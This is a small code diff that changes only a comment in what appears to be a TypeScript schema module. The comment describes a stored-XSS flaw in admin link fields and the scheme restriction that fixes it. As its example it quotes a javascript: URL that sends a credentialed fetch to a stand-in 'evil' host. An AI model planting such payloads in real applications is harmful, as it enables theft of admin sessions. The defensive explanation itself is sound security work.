@@ -27,7 +27,7 @@ import { NonEmptyStringSchema, TimestampSchema } from './schema-primitives.js'
  * author wrote) and land in the detail page's link list. Declared as a bare
  * `z.string()` they were stored XSS in the authenticated admin origin: a record
  * carrying `javascript:fetch('https://evil',{credentials:'include'})` becomes a
- * clickable link on `/apps/:slug`. The scheme constraint is the contract, and
+ * clickable link on `/admin/apps/:slug`. The scheme constraint is the contract, and
  * registry ingestion refuses a non-http(s) value before it is ever persisted.
  *
  * Only the scheme is judged here. A hostile *host* is a different question,
